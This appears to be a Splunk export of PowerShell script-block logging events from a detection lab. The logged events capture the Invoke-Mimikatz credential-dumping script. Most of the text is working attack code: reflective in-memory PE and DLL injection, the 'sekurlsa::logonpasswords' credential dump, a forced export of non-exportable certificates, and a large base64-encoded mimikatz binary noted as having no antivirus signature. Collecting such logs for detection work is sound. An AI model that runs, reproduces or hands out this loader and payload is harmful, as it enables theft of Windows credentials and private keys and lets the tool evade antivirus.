[IntPtr]::Zero)\n\t\t\t\t    {\n\t\t\t\t\t    Throw \"Couldn't find function address.\"\n\t\t\t\t    }\n\t\t\t\t    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])\n\t\t\t\t    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)\n                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)\n\t\t\t\t    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)\n                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)\n\t\t\t\t    if ($OutputPtr -eq [IntPtr]::Zero)\n\t\t\t\t    {\n\t\t\t\t    \tThrow \"Unable to get output, Output Ptr is NULL\"\n\t\t\t\t    }\n\t\t\t\t    else\n\t\t\t\t    {\n\t\t\t\t        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)\n\t\t\t\t        Write-Output $Output\n\t\t\t\t        $Win32Functions.LocalFree.Invoke($OutputPtr);\n\t\t\t\t    }\n\t\t\t#########################################\n\t\t\t### END OF YOUR CODE\n\t\t\t#########################################\n\t\t}\n\t\t#For remote DLL injection, call a void function which takes no parameters\n\t\telseif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -ne [IntPtr]::Zero))\n\t\t{\n\t\t\t$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"VoidFunc\"\n\t\t\tif (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))\n\t\t\t{\n\t\t\t\tThrow \"VoidFunc couldn't be found in the DLL\"\n\t\t\t}\n\t\t\t\n\t\t\t$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle\n\t\t\t$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle\n\t\t\t\n\t\t\t#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors\n\t\t\t$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions\n\t\t}\n\t\t\n\t\t#Don't free a library if it is injected in a remote process\n\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t{\n\t\t\tInvoke-MemoryFreeLibrary -PEHandle $PEHandle\n\t\t}\n\t\telse\n\t\t{\n\t\t\t#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process\n\t\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\n\t\t\tif ($Success -eq $false)\n\t\t\t{\n\t\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" -WarningAction Continue\n\t\t\t}\n\t\t}\n\t\t\n\t\tWrite-Verbose \"Done!\"\n\t}\n\n\tMain\n}\n\n#Main function to either run the script locally or remotely\nFunction Main\n{\n\tif (($PSCmdlet.MyInvocation.BoundParameters[\"Debug\"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[\"Debug\"].IsPresent)\n\t{\n\t\t$DebugPreference  = \"Continue\"\n\t}\n\t\n\tWrite-Verbose \"PowerShell ProcessID: $PID\"\n\t\n\n\tif ($PsCmdlet.ParameterSetName -ieq \"DumpCreds\")\n\t{\n\t\t$ExeArgs = \"sekurlsa::logonpasswords exit\"\n\t}\n    elseif ($PsCmdlet.ParameterSetName -ieq \"DumpCerts\")\n    {\n        $ExeArgs = \"crypto::cng crypto::capi `\"crypto::certificates /export`\" `\"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`\" exit\"\n    }\n    else\n    {\n        $ExeArgs = $Command\n    }\n\n    [System.IO.Directory]::SetCurrentDirectory($pwd)\n\n    # mimikatz 2.2.0 (x64) #18362\n    # SHA256 hash: E4B762ECA32A797E305C9949504B95C4CDCF68FC8EEE0B3C101842488AF27D4F\n    # VirusTotal Analysis: no signature yet ;)\n    $PEBytes64 = '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\nd261f22f-3dc8-4dc6-914f-cd178abb26fe","_time":"2025-11-23T14:39:14.627+0000","category":"Execute","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","event_id":"409","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"409","index":"mydfir-project","linecount":"127","punct":"//_::._=--/===-==-------==--====___=__=________.__","severity":"medium","severity_id":"3","signature_id":"4104","source":"Microsoft-Windows-PowerShell/Operational","sourcetype":"WinEventLog","splunk_server":"chalitha-splunk","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","vendor_product":"Microsoft Windows"}}
{"preview":false,"result":{"AssemblyBuilder":"$Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)","Attributes":"'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'","ComputerName":"DESKTOP-78CU07R","ConstructorInfo":"[System.Runtime.InteropServices.MarshalAsAttribute]","DefaultParameterSetName":"DumpCreds","DllCharacteristicsType":"$TypeBuilder.CreateType()","Domain":"[AppDomain]","DynamicAssembly":"New-Object","EventCode":"4104","EventType":"3","IMAGE_DATA_DIRECTORY":"$TypeBuilder.CreateType()","IMAGE_FILE_HEADER":"$TypeBuilder.CreateType()","Keywords":"None","LogName":"Microsoft-Windows-PowerShell/Operational","MachineType":"$TypeBuilder.CreateType()","MagicType":"$TypeBuilder.CreateType()","Mandatory":"$true","Message":"Splunk","ModuleBuilder":"$AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)","OpCode":"On","ParameterSetName":"DumpCreds","Position":"0","RecordNumber":"401","RemoteScriptBlock":"{","Sid":"S-1-5-21-1697325460-2044954953-441488130-1001","SidType":"0","SourceName":"Microsoft-Windows-PowerShell","SubSystemType":"$TypeBuilder.CreateType()","TaskCategory":"Execute","Type":"Warning","TypeBuilder":"$ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])","User":"NOT_TRANSLATED","Win32Types":"New-Object","_raw":"11/23/2025 08:39:14.627 AM\nLogName=Microsoft-Windows-PowerShell/Operational\nEventCode=4104\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1697325460-2044954953-441488130-1001\nSidType=0\nSourceName=Microsoft-Windows-PowerShell\nType=Warning\nRecordNumber=401\nKeywords=None\nTaskCategory=Execute a Remote Command\nOpCode=On create calls\nMessage=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.\n\nFormatMessage error:\n\nGot the following information from this event: \n\nfunction Invoke-Mimikatz\n{\n<#\n.SYNOPSIS\n\nThis script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as\ndump credentials without ever writing the mimikatz binary to disk. \nThe script has a ComputerName parameter which allows it to be executed against multiple computers.\n\nThis script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.\n\nFunction: Invoke-Mimikatz\nAuthor: Joe Bialek, Twitter: @JosephBialek\nMimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi\nLicense:  http://creativecommons.org/licenses/by/3.0/fr/\nRequired Dependencies: Mimikatz (included)\nOptional Dependencies: None\nMimikatz version: 2.0 alpha (12/14/2015)\n\n.DESCRIPTION\n\nReflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any \nfunctionality provided with Mimikatz.\n\n.PARAMETER DumpCreds\n\nSwitch: Use mimikatz to dump credentials out of LSASS.\n\n.PARAMETER DumpCerts\n\nSwitch: Use mimikatz to export all private certificates (even if they are marked non-exportable).\n\n.PARAMETER Command\n\nSupply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz \"privilege::debug exit\" as an example.\n\n.PARAMETER ComputerName\n\nOptional, an array of computernames to run the script on.\n\t\n.EXAMPLE\n\nExecute mimikatz on the local computer to dump certificates.\nInvoke-Mimikatz -DumpCerts\n\n.EXAMPLE\n\nExecute 